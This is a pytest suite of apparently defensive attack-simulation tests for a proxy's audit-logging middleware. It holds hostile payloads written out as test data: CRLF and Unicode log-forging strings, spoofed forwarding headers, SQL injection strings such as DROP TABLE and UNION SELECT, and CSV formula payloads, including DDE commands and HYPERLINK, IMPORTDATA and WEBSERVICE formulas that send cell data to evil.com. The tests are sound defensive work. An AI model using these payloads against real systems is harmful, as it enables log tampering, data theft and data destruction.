"""Attack simulation tests for SHIELD-23 audit logging.

Simulates real-world attack vectors from OWASP and security research:
- Log injection (CRLF, Unicode line separators, log forging)
- XFF spoofing / IP forgery
- CSV formula injection (DDE, macros, European locale)
- SQL injection attempts in query parameters
- VARCHAR overflow causing silent audit evasion
- Unicode bypass of sanitization (bidi overrides, zero-width chars)
- Oversized payloads / resource exhaustion
- Tenant isolation
"""

from __future__ import annotations

import csv
import io
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from starlette.responses import Response

from proxy.middleware.audit_logger import AuditLogger, _sanitize
from proxy.middleware.pipeline import RequestContext
from proxy.api.audit_routes import _csv_safe, _rows_to_csv, _parse_datetime


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _mock_tenant_tx(mock_conn):
    """Return a mock tenant_transaction that yields *mock_conn*."""
    @asynccontextmanager
    async def _tx(tenant_id):
        yield mock_conn
    return _tx

def _make_request(
    method: str = "GET",
    path: str = "/api/data",
    client_ip: str = "10.0.0.1",
    user_agent: str = "TestAgent/1.0",
    headers_extra: dict | None = None,
) -> MagicMock:
    req = MagicMock()
    req.method = method
    req.url = MagicMock()
    req.url.path = path
    req.client = MagicMock()
    req.client.host = client_ip
    _headers = {"user-agent": user_agent, "host": "app.example.com"}
    if headers_extra:
        _headers.update(headers_extra)
    req.headers = MagicMock()
    req.headers.get = lambda key, default="": _headers.get(key, default)
    return req


def _make_context(tenant_id: str = "tenant-1") -> RequestContext:
    ctx = RequestContext()
    ctx.tenant_id = tenant_id
    ctx.request_id = "abc123"
    ctx.customer_config = {"enabled_features": {"audit_logging": True}}
    return ctx


_AUDIT_FIELDS = ("tenant_id", "app_id", "request_id", "timestamp", "method", "path",
                 "status_code", "duration_ms", "client_ip", "user_agent", "country",
                 "user_id", "action", "blocked")

async def _capture_audit(logger, req, ctx, response):
    """Run process_request + process_response and capture the audit row as a dict."""
    await logger.process_request(req, ctx)
    await logger.process_response(response, ctx)
    if logger._queue.empty():
        return {}
    row = logger._queue.get_nowait()
    return dict(zip(_AUDIT_FIELDS, row))


# ===================================================================
# 1. LOG INJECTION — CRLF / Control Characters
# ===================================================================

class TestLogInjection:
    """Attacker injects control chars in path/UA to forge log entries."""

    @pytest.mark.parametrize("payload,description", [
        ("/api/data\r\nINFO: forged admin login", "CRLF in path"),
        ("/api/data\nFake log line", "LF in path"),
        ("/api/data\rOverwrite line", "CR in path"),
        ("/api/data\x00hidden payload", "null byte in path"),
        ("/api/data\x1b[2J\x1b[1;1H", "ANSI escape sequence clears terminal"),
    ])
    def test_control_chars_stripped_from_path(self, payload, description):
        result = _sanitize(payload, 2048)
        assert "\r" not in result, f"CR not stripped: {description}"
        assert "\n" not in result, f"LF not stripped: {description}"
        assert "\x00" not in result, f"Null not stripped: {description}"
        assert "\x1b" not in result, f"ESC not stripped: {description}"

    @pytest.mark.parametrize("payload", [
        "Mozilla/5.0\r\nX-Admin: true",
        "Bot\nINJECTED LOG LINE",
        "Agent\x00hidden",
    ])
    def test_control_chars_stripped_from_user_agent(self, payload):
        result = _sanitize(payload, 1024)
        assert "\r" not in result
        assert "\n" not in result
        assert "\x00" not in result

    @pytest.mark.asyncio
    async def test_crlf_in_path_does_not_forge_audit_entry(self):
        """CRLF injection in path cannot create fake log entries."""
        logger = AuditLogger()
        malicious_path = '/api/data\r\n{"action":"admin_login","user":"attacker"}'
        req = _make_request(path=malicious_path)
        ctx = _make_context()
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)

        assert "\r" not in captured.get("path", "")
        assert "\n" not in captured.get("path", "")
        assert "admin_login" not in captured.get("action", "")


# ===================================================================
# 2. UNICODE BYPASS OF SANITIZATION
# ===================================================================

class TestUnicodeBypass:
    """Attacker uses Unicode control chars to bypass ASCII-only sanitization."""

    @pytest.mark.parametrize("char,name", [
        ("\u2028", "line separator"),
        ("\u2029", "paragraph separator"),
        ("\u200b", "zero-width space"),
        ("\u200c", "zero-width non-joiner"),
        ("\u200d", "zero-width joiner"),
        ("\u200e", "left-to-right mark"),
        ("\u200f", "right-to-left mark"),
        ("\u202a", "left-to-right embedding"),
        ("\u202b", "right-to-left embedding"),
        ("\u202c", "pop directional formatting"),
        ("\u202d", "left-to-right override"),
        ("\u202e", "right-to-left override"),
        ("\u2066", "left-to-right isolate"),
        ("\u2067", "right-to-left isolate"),
        ("\u2068", "first strong isolate"),
        ("\u2069", "pop directional isolate"),
        ("\ufeff", "BOM / zero-width no-break space"),
        ("\x80", "C1 control PAD"),
        ("\x8d", "C1 control RI"),
        ("\x9f", "C1 control APC"),
    ])
    def test_unicode_control_chars_stripped(self, char, name):
        """Unicode control character '{name}' must be stripped by _sanitize."""
        payload = f"/api/{char}data"
        result = _sanitize(payload, 2048)
        assert char not in result, f"Unicode char {name} (U+{ord(char):04X}) not stripped"

    def test_rtl_override_attack(self):
        """RTL override to disguise 'exe.txt' as 'txt.exe' is stripped."""
        # \u202e reverses text display: "txt.exe" displays as "exe.txt"
        payload = "/uploads/\u202etxt.exe"
        result = _sanitize(payload, 2048)
        assert "\u202e" not in result
        assert result == "/uploads/txt.exe"

    def test_zero_width_invisible_payload(self):
        """Zero-width chars creating invisible payloads are stripped."""
        payload = "/api/\u200b\u200c\u200ddata"
        result = _sanitize(payload, 2048)
        assert result == "/api/data"

    @pytest.mark.asyncio
    async def test_unicode_line_separator_in_path(self):
        """Unicode line separator in path cannot create multi-line audit entry."""
        logger = AuditLogger()
        req = _make_request(path="/api/\u2028fake_line\u2029another")
        ctx = _make_context()
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)
        assert "\u2028" not in captured["path"]
        assert "\u2029" not in captured["path"]
        assert captured["path"] == "/api/fake_lineanother"


# ===================================================================
# 3. XFF SPOOFING / IP FORGERY
# ===================================================================

class TestXFFSpoofing:
    """Attacker spoofs X-Forwarded-For to forge or hide their IP."""

    @pytest.mark.asyncio
    async def test_xff_spoofing_ignored(self):
        """Spoofed X-Forwarded-For MUST NOT override the real peer IP."""
        logger = AuditLogger()
        req = _make_request(client_ip="203.0.113.99")
        ctx = _make_context()
        # Simulate ContextInjector having set XFF with a spoofed IP prepended
        ctx.extra["x_forwarded_for"] = "1.2.3.4, 203.0.113.99"

        await logger.process_request(req, ctx)
        response = Response(content="OK", status_code=200)

        await logger.process_response(response, ctx)
        row = logger._queue.get_nowait()
        captured = dict(zip(_AUDIT_FIELDS, row))

        # Must use direct peer IP, NOT the spoofed first XFF entry
        assert captured["client_ip"] == "203.0.113.99"
        assert captured["client_ip"] != "1.2.3.4"

    @pytest.mark.asyncio
    async def test_xff_overflow_does_not_evade_audit(self):
        """Oversized XFF header cannot cause INSERT failure to evade auditing."""
        logger = AuditLogger()
        req = _make_request(client_ip="10.0.0.1")
        ctx = _make_context()
        # Even with absurd XFF, we use direct IP, truncated to 45 chars
        ctx.extra["x_forwarded_for"] = "A" * 10000

        await logger.process_request(req, ctx)
        response = Response(content="OK", status_code=200)

        await logger.process_response(response, ctx)
        row = logger._queue.get_nowait()
        captured = dict(zip(_AUDIT_FIELDS, row))

        # Direct IP used, fits in VARCHAR(45)
        assert len(captured["client_ip"]) <= 45
        assert captured["client_ip"] == "10.0.0.1"

    @pytest.mark.asyncio
    async def test_xff_sql_injection_harmless(self):
        """SQL injection in XFF header is harmless (we use direct IP + parameterized SQL)."""
        logger = AuditLogger()
        req = _make_request(client_ip="10.0.0.1")
        ctx = _make_context()
        ctx.extra["x_forwarded_for"] = "'; DROP TABLE audit_logs; --"

        await logger.process_request(req, ctx)
        response = Response(content="OK", status_code=200)

        await logger.process_response(response, ctx)
        row = logger._queue.get_nowait()
        captured = dict(zip(_AUDIT_FIELDS, row))

        assert captured["client_ip"] == "10.0.0.1"  # Direct IP, not XFF


# ===================================================================
# 4. CSV FORMULA INJECTION
# ===================================================================

class TestCSVInjection:
    """Attacker stores payloads that trigger formula execution in spreadsheet exports."""

    @pytest.mark.parametrize("payload,description", [
        ("=CMD('calc')", "basic equals formula"),
        ("+CMD('calc')", "plus prefix"),
        ("-1+1", "minus prefix"),
        ("@SUM(A1:A10)", "at-sign prefix"),
        ("\t=CMD()", "tab then formula"),
        ("\r=CMD()", "CR then formula"),
        ("|calc", "pipe prefix (LibreOffice)"),
        (";=CMD()", "semicolon prefix (European CSV)"),
        ("=DDE(\"cmd\";\"/C calc\";\"\")", "DDE attack"),
        ("=HYPERLINK(\"https://evil.com/steal?\"&A1,\"Click\")", "hyperlink exfil"),
        ("=IMPORTDATA(\"https://evil.com/\"&A1)", "Google Sheets import"),
        ("=WEBSERVICE(\"https://evil.com/\"&A1)", "Excel webservice"),
    ])
    def test_formula_prefixes_neutralized(self, payload, description):
        """CSV cell starting with '{description}' is prefixed with quote."""
        result = _csv_safe(payload)
        assert result.startswith("'"), f"Not neutralized: {description}: {result!r}"

    def test_normal_values_unchanged(self):
        """Normal values (paths, methods, IPs) are not modified."""
        assert _csv_safe("/api/data") == "/api/data"
        assert _csv_safe("GET") == "GET"
        assert _csv_safe("10.0.0.1") == "10.0.0.1"
        assert _csv_safe("200") == "200"
        assert _csv_safe("api_read") == "api_read"

    def test_csv_writer_handles_embedded_quotes(self):
        """csv.writer properly escapes embedded double quotes."""
        rows = [{"id": 1, "path": '/api/"quoted"', "tenant_id": "t1",
                 "app_id": "", "request_id": "r1", "timestamp": "2025-01-01",
                 "method": "GET", "status_code": 200, "duration_ms": 1.0,
                 "client_ip": "", "user_agent": "", "country": "",
                 "user_id": "", "action": "api_read", "blocked": False}]
        csv_str = _rows_to_csv(rows)
        # Verify the CSV is parseable
        reader = csv.reader(io.StringIO(csv_str))
        header = next(reader)
        data = next(reader)
        assert len(data) == len(header)

    def test_csv_writer_handles_embedded_newlines(self):
        """csv.writer properly quotes fields containing newlines."""
        rows = [{"id": 1, "path": "/api/line1\nline2", "tenant_id": "t1",
                 "app_id": "", "request_id": "r1", "timestamp": "2025-01-01",
                 "method": "GET", "status_code": 200, "duration_ms": 1.0,
                 "client_ip": "", "user_agent": "", "country": "",
                 "user_id": "", "action": "api_read", "blocked": False}]
        csv_str = _rows_to_csv(rows)
        # Should be parseable — csv.writer handles this with quoting
        reader = csv.reader(io.StringIO(csv_str))
        rows_parsed = list(reader)
        assert len(rows_parsed) == 2  # header + 1 data row

    def test_multi_cell_breakout_prevented(self):
        """Attacker cannot break out of CSV cell to inject into adjacent cells."""
        # Attempt: value with comma to create extra columns
        malicious = 'test","=CMD()","more'
        result = _csv_safe(malicious)
        # csv.writer will quote the entire field, preventing breakout
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow([result])
        csv_output = buf.getvalue()
        # When parsed back, should be a single cell
        reader = csv.reader(io.StringIO(csv_output))
        row = next(reader)
        assert len(row) == 1  # Not broken into multiple cells


# ===================================================================
# 5. SQL INJECTION IN QUERY PARAMETERS
# ===================================================================

class TestSQLInjection:
    """Attacker sends SQL injection payloads in audit log query filters."""

    @pytest.mark.asyncio
    async def test_sqli_in_tenant_id_rejected_by_rls(self):
        """SQL injection in tenant_id is rejected by RLS validate_tenant_id
        before it ever reaches the SQL query (defense-in-depth)."""
        from proxy.store.audit import query_audit_logs
        from proxy.store.rls import validate_tenant_id

        # validate_tenant_id rejects non-UUID strings
        with pytest.raises(ValueError):
            validate_tenant_id("' OR '1'='1' --")

        # query_audit_logs with a non-UUID tenant_id raises ValueError
        # from tenant_transaction → validate_tenant_id
        mock_pool = MagicMock()
        with patch("proxy.store.audit.get_pool", return_value=mock_pool):
            with pytest.raises(ValueError):
                await query_audit_logs(tenant_id="' OR '1'='1' --")

    @pytest.mark.asyncio
    async def test_sqli_in_action_filter(self):
        """SQL injection in action filter is parameterized."""
        from proxy.store.audit import query_audit_logs

        mock_conn = AsyncMock()
        mock_conn.fetch = AsyncMock(return_value=[])
        mock_pool = MagicMock()
        mock_pool.acquire = MagicMock()
        mock_pool.acquire.return_value.__aenter__ = AsyncMock(return_value=mock_conn)
        mock_pool.acquire.return_value.__aexit__ = AsyncMock(return_value=False)

        with patch("proxy.store.audit.get_pool", return_value=mock_pool), \
             patch("proxy.store.audit.tenant_transaction", _mock_tenant_tx(mock_conn)):
            await query_audit_logs(
                tenant_id="t1",
                action="login'; DROP TABLE audit_logs; --",
            )

        sql = mock_conn.fetch.call_args[0][0]
        assert "DROP" not in sql

    @pytest.mark.asyncio
    async def test_sqli_in_path_like_filter(self):
        """SQL injection in path LIKE filter is parameterized."""
        from proxy.store.audit import query_audit_logs

        mock_conn = AsyncMock()
        mock_conn.fetch = AsyncMock(return_value=[])
        mock_pool = MagicMock()
        mock_pool.acquire = MagicMock()
        mock_pool.acquire.return_value.__aenter__ = AsyncMock(return_value=mock_conn)
        mock_pool.acquire.return_value.__aexit__ = AsyncMock(return_value=False)

        with patch("proxy.store.audit.get_pool", return_value=mock_pool), \
             patch("proxy.store.audit.tenant_transaction", _mock_tenant_tx(mock_conn)):
            await query_audit_logs(
                tenant_id="t1",
                path="' UNION SELECT * FROM customers --",
            )

        sql = mock_conn.fetch.call_args[0][0]
        assert "UNION" not in sql
        assert "SELECT * FROM customers" not in sql

    @pytest.mark.asyncio
    async def test_sqli_in_user_id_filter(self):
        """SQL injection in user_id filter is parameterized."""
        from proxy.store.audit import query_audit_logs

        mock_conn = AsyncMock()
        mock_conn.fetch = AsyncMock(return_value=[])
        mock_pool = MagicMock()
        mock_pool.acquire = MagicMock()
        mock_pool.acquire.return_value.__aenter__ = AsyncMock(return_value=mock_conn)
        mock_pool.acquire.return_value.__aexit__ = AsyncMock(return_value=False)

        with patch("proxy.store.audit.get_pool", return_value=mock_pool), \
             patch("proxy.store.audit.tenant_transaction", _mock_tenant_tx(mock_conn)):
            await query_audit_logs(
                tenant_id="t1",
                user_id="1; DELETE FROM audit_logs WHERE 1=1; --",
            )

        sql = mock_conn.fetch.call_args[0][0]
        assert "DELETE" not in sql


# ===================================================================
# 6. VARCHAR OVERFLOW / AUDIT EVASION
# ===================================================================

class TestFieldOverflow:
    """Attacker sends oversized fields to cause INSERT failure, evading audit."""

    @pytest.mark.asyncio
    async def test_oversized_path_truncated(self):
        """Path longer than 2048 is truncated, not rejected."""
        logger = AuditLogger()
        long_path = "/api/" + "x" * 5000
        req = _make_request(path=long_path)
        ctx = _make_context()
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)
        assert len(captured["path"]) <= 2048

    @pytest.mark.asyncio
    async def test_oversized_user_agent_truncated(self):
        """User agent longer than 1024 is truncated."""
        logger = AuditLogger()
        long_ua = "Bot/" + "x" * 5000
        req = _make_request(user_agent=long_ua)
        ctx = _make_context()
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)
        assert len(captured["user_agent"]) <= 1024

    @pytest.mark.asyncio
    async def test_oversized_user_id_truncated(self):
        """User ID longer than 255 is truncated, not causing INSERT failure."""
        logger = AuditLogger()
        req = _make_request()
        ctx = _make_context()
        ctx.user_id = "user_" + "x" * 500
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)
        assert len(captured["user_id"]) <= 255

    @pytest.mark.asyncio
    async def test_client_ip_truncated_to_45(self):
        """Client IP is truncated to 45 chars (max IPv6 length)."""
        logger = AuditLogger()
        req = _make_request(client_ip="a" * 100)
        ctx = _make_context()
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)
        assert len(captured["client_ip"]) <= 45

    @pytest.mark.asyncio
    async def test_country_truncated(self):
        """Country field is truncated to 8 chars."""
        logger = AuditLogger()
        req = _make_request()
        ctx = _make_context()
        ctx.extra["country"] = "OVERSIZED_COUNTRY"
        await logger.process_request(req, ctx)
        response = Response(content="OK", status_code=200)

        await logger.process_response(response, ctx)
        row = logger._queue.get_nowait()
        captured = dict(zip(_AUDIT_FIELDS, row))

        assert len(captured["country"]) <= 8


# ===================================================================
# 7. LOG FORGING — TRUSTED FIELDS
# ===================================================================

class TestLogForging:
    """Verify that attacker cannot influence trusted audit fields."""

    @pytest.mark.asyncio
    async def test_action_field_from_classifier_not_user_input(self):
        """Action field comes from classify_action(), not user input."""
        logger = AuditLogger()
        req = _make_request()
        ctx = _make_context()
        # Even if attacker somehow puts a fake action in context
        ctx.extra["action"] = "admin_privilege_escalation"
        response = Response(content="OK", status_code=200)

        captured = await _capture_audit(logger, req, ctx, response)
        # Action comes from classifier, not from context.extra["action"]
        assert captured["action"] == "api_read"

    @pytest.mark.asyncio
    async def test_timestamp_is_server_generated(self):
        """Timestamp comes from server clock, not client input."""
        logger = AuditLogger()
        req = _make_request()
        ctx = _make_context()
        response = Response(content="OK", status_code=200)

        before = datetime.now(timezone.utc)
        captured = await _capture_audit(logger, req, ctx, response)
        after = datetime.now(timezone.utc)

        assert before <= captured["timestamp"] <= after

    @pytest.mark.asyncio
    async def test_status_code_from_response_not_forged(self):
        """Status code comes from actual response object."""
        logger = AuditLogger()
        req = _make_request()
        ctx = _make_context()
        response = Response(content="Forbidden", status_code=403)

        captured = await _capture_audit(logger, req, ctx, response)
        assert captured["status_code"] == 403


# ===================================================================
# 8. ERROR DETAIL LEAKAGE
# ===================================================================

class TestErrorLeakage:
    """Error messages don't leak excessive internal information."""

    def test_long_datetime_input_truncated_in_error(self):
        """Oversized datetime input is truncated in the error message."""
        from fastapi import HTTPException

        long_input = "A" * 10000
        with pytest.raises(HTTPException) as exc_info:
            _parse_datetime(long_input, "start_time")

        detail = exc_info.value.detail
        # The reflected input should be truncated
        assert len(detail) < 200
        assert "..." in detail


# ===================================================================
# 9. TENANT ISOLATION
# ===================================================================

class TestTenantIsolation:
    """Verify tenant boundary enforcement."""

    @pytest.mark.asyncio
    async def test_query_always_filters_by_tenant(self):
        """Every query includes tenant_id filter — no way to query across tenants."""
        from proxy.store.audit import query_audit_logs

        mock_conn = AsyncMock()
        mock_conn.fetch = AsyncMock(return_value=[])
        mock_pool = MagicMock()
        mock_pool.acquire = MagicMock()
        mock_pool.acquire.return_value.__aenter__ = AsyncMock(return_value=mock_conn)
        mock_pool.acquire.return_value.__aexit__ = AsyncMock(return_value=False)

        with patch("proxy.store.audit.get_pool", return_value=mock_pool), \
             patch("proxy.store.audit.tenant_transaction", _mock_tenant_tx(mock_conn)):
            await query_audit_logs(tenant_id="tenant-1")

        sql = mock_conn.fetch.call_args[0][0]
        assert "tenant_id = $1" in sql

        # The tenant_id is ALWAYS the first condition — cannot be removed
        where_clause = sql.split("WHERE")[1]
        assert where_clause.strip().startswith("tenant_id = $1")

    @pytest.mark.asyncio
    async def test_wildcard_tenant_not_possible(self):
        """Passing '*' or '%' as tenant_id is now rejected by RLS
        validate_tenant_id (defense-in-depth). Non-UUID strings never reach SQL."""
        from proxy.store.rls import validate_tenant_id

        for wildcard in ("*", "%", "", "null"):
            with pytest.raises(ValueError):
                validate_tenant_id(wildcard)


# ===================================================================
# 10. RESOURCE EXHAUSTION / DoS
# ===================================================================

class TestResourceExhaustion:
    """Attacker tries to exhaust resources through audit system."""

    def test_query_limit_clamped(self):
        """Cannot request more than 1000 rows per query."""
        from proxy.store.audit import _MAX_QUERY_LIMIT
        assert _MAX_QUERY_LIMIT == 1000

    def test_bounded_task_queue(self):
        """Pending audit tasks capped at 10000 to prevent memory exhaustion."""
        logger = AuditLogger()
        assert logger._queue.maxsize == 10000

    @pytest.mark.asyncio
    async def test_insert_failure_does_not_block_response(self):
        """Even with audit queueing, responses are returned immediately."""
        logger = AuditLogger()
        req = _make_request()
        ctx = _make_context()
        await logger.process_request(req, ctx)
        response = Response(content="OK", status_code=200)
        result = await logger.process_response(response, ctx)
        assert result.status_code == 200
